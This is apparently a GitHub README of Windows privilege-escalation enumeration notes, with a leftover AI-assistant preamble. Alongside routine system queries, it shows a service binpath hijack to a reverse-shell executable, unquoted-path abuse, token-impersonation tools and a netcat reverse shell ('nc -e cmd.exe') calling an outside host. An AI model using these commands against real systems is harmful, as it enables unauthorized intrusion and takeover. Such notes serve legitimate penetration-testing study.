# Widnows-Enumuration-for-PrivESC-
here i drop the most exact commands used for windows enumuration for privESC
Alright — I’ll clean this up and turn it into **real red team–level enumeration notes** the way a senior operator would maintain them. No fluff, only what actually matters during PrivEsc.

---

# 🔴 Windows Privilege Escalation – Enumeration Notes

*(Red Team Operator – Field Checklist)*

---

# 1. 🔍 Initial Situational Awareness

## Current User Context

```
whoami
whoami /priv
whoami /groups
```

👉 Goal:

* Check if you're already in **high-priv groups** (Administrators, Backup Operators, etc.)
* Look for dangerous privileges:

  * SeImpersonatePrivilege 🔥
  * SeAssignPrimaryTokenPrivilege
  * SeBackupPrivilege
  * SeRestorePrivilege

---

# 2. 📁 File & Binary Permissions

## Check permissions on sensitive files

```
icacls example.txt
icacls C:\Windows\System32\cmd.exe
```

👉 Look for:

* `(F)` Full control
* `(M)` Modify
* Write access on binaries used by SYSTEM/admin

---

## Find writable directories in Program Files

```
accesschk.exe -uws "Users" "C:\Program Files"
```

👉 If writable → DLL hijacking / binary replacement possible

---

# 3. 👤 Users & Credentials

## Local users

```
net user
net user username
```

## Linux-style file (if present via tools)

```
type C:\Windows\System32\drivers\etc\hosts
```

👉 (Note: `/etc/passwd` is Linux — ignore in Windows unless WSL present)

---

# 4. 🖥️ OS & Patch Level

```
systeminfo
```

👉 Extract:

* OS version
* Build number
* Installed hotfixes

---

## Alternative (more script-friendly)

```
wmic os get caption,name,buildnumber
wmic qfe get *
```

👉 Goal:

* Match with known exploits (kernel / LPE)

---

# 5. ⚙️ Processes & Services

## Running processes

```
tasklist /v
```

## Map services to processes

```
tasklist /svc
```

👉 Look for:

* Services running as SYSTEM
* Custom / unknown binaries

---

# 6. 🌐 Network Enumeration

## IP details

```
ipconfig /all
```

## Routing table

```
route print
```

## Active connections

```
netstat -ano
```

👉 Look for:

* Listening ports
* Internal services
* Pivot opportunities

---

# 7. 🔥 Firewall Configuration

```
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
```

👉 Goal:

* Identify open ports / allowed traffic

---

# 8. ⏰ Scheduled Tasks

```
schtasks /query /v /fo list
```

## PowerShell alternative

```
Get-ScheduledTask
```

👉 Look for:

* Tasks running as SYSTEM
* Writable script/binary paths

---

# 9. 📦 Installed Programs

```
wmic product get *
wmic product get caption,description,installedlocation
```

👉 Look for:

* Vulnerable software
* Misconfigured install paths

---

# 10. 🛠️ Services Enumeration (CRITICAL)

## List services

```
sc query
```

## Service details

```
sc qc <service_name>
```

## WMIC version

```
wmic service get name,displayname,pathname,startmode
```

👉 Look for:

* Unquoted service paths 🔥
* Writable service binaries
* Weak permissions

---

## Check service permissions

```
accesschk.exe -cv <service_name>
accesschk64.exe /accepteula -ucqv <service_name>
```
---
modify the service binary path if weak config
--> sc config service_name binpath="c:\temp\reverse.exe"
and then restart the servicfe or wait for reboot if no permision
--> net start service_name
--> sc stop service_name
👉 If you can:
---
* Change config → PrivEsc
* Restart service → exploit

---

# 11. 💣 Exploitable Service Issues

### 🔥 Unquoted Service Path

Example:

```
C:\Program Files\My App\service.exe
```

👉 Abuse by placing:

```
C:\Program.exe
```

---

### 🔥 Weak Permissions

If writable:

* Replace binary
* Restart service

---

# 12. ⚡ Token Impersonation (HIGH VALUE)

If you see:

```
SeImpersonatePrivilege
```

👉 Use:

* PrintSpoofer.exe
* RoguePotato.exe

---

# 13. 🧰 Essential PrivEsc Tools

## Automated Enumeration

* winPEASany.exe 🔥
* Seatbelt.exe
* SharpUp.exe

---

## PowerShell

```
Import-Module .\PowerUp.ps1
Get-ServiceFilePermission
```

---

## SharpUp

```
.\SharpUp.exe audit
```

---

## AccessChk

```
accesschk.exe -uws "Users" "C:\Program Files"
```

---

# 14. 🚀 Exploitation Helpers

## Reverse shell

```
nc -e cmd.exe <IP> <PORT>
```

---

## Useful Tools

* PrintSpoofer.exe → Token abuse
* RoguePotato.exe → Token abuse
* PsExec64.exe → Lateral movement
* Procmon64.exe → Monitor file access

---


Always think:

* ❓ Can I **write** somewhere?
* ❓ Can I **execute** something as SYSTEM?
* ❓ Can I **modify a service/task**?
* ❓ Do I have **dangerous privileges**?

---


